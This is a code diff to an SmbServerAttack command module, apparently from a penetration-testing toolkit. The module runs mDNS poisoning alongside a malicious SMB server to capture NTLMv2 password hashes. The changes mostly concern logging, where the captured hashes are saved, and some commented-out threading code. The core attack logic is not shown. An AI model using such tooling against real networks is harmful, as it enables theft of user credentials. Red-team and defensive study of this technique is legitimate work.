@@ -73,13 +73,15 @@ class SmbServerAttack(CommandSet):
 
     def __async_options(self):
         sys.stdout = open("/dev/null", "w")
+        self.__mdns_poisoner.logger_level = "DEBUG"
+
         signal.signal(signal.SIGINT, self.__try_exit)
 
     def __display_ntlmv2(self):
         if self.__alerts_dictionary["new_ntlmv2"] == 1:
             if self._cmd.terminal_lock.acquire(blocking=False):
                 self._cmd.async_alert(
-                    f"{LogSymbols.INFO.value} New ntlmv2 hash has been discovered"
+                    f"{LogSymbols.INFO.value} New ntlmv2 hash has been discovered. Saved in {self.__path_file}"
                 )
                 self._cmd.terminal_lock.release()
             self.__alerts_dictionary["new_ntlmv2"] = 0
@@ -92,7 +94,12 @@ class SmbServerAttack(CommandSet):
         mdns_thread = Thread(target=self.__mdns_poisoner.start_mdns_poisoning)
         mdns_thread.daemon = True
         mdns_thread.start()
+
         self.__smbserver.start_malicious_smbserver()
+        # malicious_smbserver_thread = Thread(target=self.__smbserver.start_malicious_smbserver())
+        # malicious_smbserver_thread.dameon = True
+        # malicious_smbserver_thread.start()
+        # malicious_smbserver_thread.join()
 
     def __launch_necessary_components(self, args: argparse.Namespace) -> None:
         if args.Asynchronous:
@@ -201,10 +208,11 @@ class SmbServerAttack(CommandSet):
                 target=self.__launch_necessary_components, args=(args,)
             )
             self.__attack.start()
+            self._cmd.info_logger.info(
+                f"Running mss the results will be saved in : {self.__path_file} "
+            )
+
             if not args.Asynchronous:
-                self._cmd.info_logger.info(
-                    f"Running mss the results will be saved in : {self.__path_file} "
-                )
                 self.__synchronous_attack()
 
     def mss_postloop(self) -> None:
